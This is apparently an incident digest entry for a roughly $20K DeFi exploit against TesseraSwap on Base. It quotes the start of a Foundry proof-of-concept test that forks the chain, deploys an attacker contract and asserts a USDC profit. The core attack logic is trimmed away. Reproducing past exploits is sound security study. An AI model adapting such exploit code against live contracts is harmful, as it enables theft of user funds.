# [?] TesseraSwap - Callback Repayment Price Spread

## Summary
Severity: Unknown
Chain: Base
Component: TesseraSwap
Published: 2026-05-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/TesseraSwap_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$20K

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    uint256 private constant FORK_BLOCK = 46_175_320;
    uint256 private constant MIN_USDC_PROFIT = 10_000_000;

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        fundingToken = USDC_TOKEN;
        multiAssetLog = true;
        attacker = ATTACKER;
        _addFundingToken(WETH_TOKEN);
        _addFundingToken(USDC_TOKEN);

        vm.label(ATTACKER, "Attacker");
        vm.label(TESSERA_SWAP, "TesseraSwap");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WETH_USDC_POOL, "WETH/USDC Pool");
    }

    function testExploit() public balanceLog {
        uint256 usdcBefore = IERC20(USDC_TOKEN).balanceOf(ATTACKER);
        TesseraSwapAttacker attackContract = new TesseraSwapAttacker();

        vm.startPrank(ATTACKER, ATTACKER);
        attackContract.executeAttack();
        vm.stopPrank();

        uint256 usdcProfit = IERC20(USDC_TOKEN).balanceOf(ATTACKER) - usdcBefore;

        assertGt(usdcProfit, MIN_USDC_PROFIT, "USDC profit");
    }
}

contract TesseraSwapAttacker {
    uint256 private constant LOOP_COUNT = 100;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/TesseraSwap_exp.sol_
